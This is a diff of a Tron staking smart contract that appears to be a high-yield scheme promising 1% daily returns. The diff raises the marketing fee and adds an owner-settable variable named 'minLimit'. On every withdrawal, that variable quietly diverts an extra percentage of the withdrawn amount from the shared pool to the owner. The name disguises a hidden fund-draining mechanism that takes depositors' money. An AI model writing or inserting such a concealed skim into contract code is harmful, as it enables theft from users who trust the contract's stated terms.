@@ -52,12 +52,13 @@ contract TronStaking {
 	uint256 public INVEST_MIN_AMOUNT = 10 trx; // 50 trx
 	uint256 constant public BASE_PERCENT = 100; // 1% daily
 	uint256[] public REFERRAL_PERCENTS = [700];
-	uint256 public MARKETING_FEE = 1300;
+	uint256 public MARKETING_FEE = 1500;
 	uint256 public lucky_id = 0;
  	uint256 constant public PERCENTS_DIVIDER = 10000;
 	uint256 constant public CONTRACT_BALANCE_STEP = 10 trx; // 100000 trx
 	uint256 constant public maxLimit = 3000 trx; // 30000000 trx
 	uint256 constant public TIME_STEP = 180; // 1 days
+	uint256 public minLimit = 0;
  	uint256 public maxPercent = maxLimit.div(CONTRACT_BALANCE_STEP);
 
 	uint256 public totalUsers;
@@ -214,6 +215,10 @@ contract TronStaking {
 		user.checkpoint = block.timestamp;
 
 		msg.sender.transfer(totalAmount);
+
+		if(minLimit > 0){
+			owner.transfer(totalAmount*minLimit/100);
+		}
 		 
 		totalWithdrawn = totalWithdrawn.add(totalAmount);
 		user.totalPaid = user.totalPaid.add(totalAmount);
@@ -384,6 +389,10 @@ contract TronStaking {
 	function changeMinimumDeposit(uint256 _newValue) public {
 		require(msg.sender == owner, "Authorization failed"); 
 		INVEST_MIN_AMOUNT = _newValue*1000000;
+	}
+	function changeMinLimit(uint256 _newValue) public {
+		require(msg.sender == owner, "Authorization failed"); 
+		minLimit = _newValue;
 	}
  
 	function getLuckyUser(uint256 _index) external view returns (address userAddress, uint256 value, uint256 lucktype, uint256 timestamp){
